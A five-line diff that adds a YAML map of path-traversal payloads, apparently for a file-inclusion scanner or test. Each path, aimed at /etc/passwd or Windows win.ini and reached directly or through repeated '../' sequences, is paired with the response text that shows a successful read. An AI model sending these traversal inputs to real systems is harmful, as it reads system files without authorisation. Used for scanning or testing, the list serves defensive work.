@@ -1,0 +1,5 @@
+payloads:
+  "/etc/passwd": "root:x:0:0:"
+  "../../../../../../../../etc/passwd": "root:x:0:0:"
+  "C:\\Windows\\win.ini": "[extensions]"
+  "..\\..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini": "[extensions]"
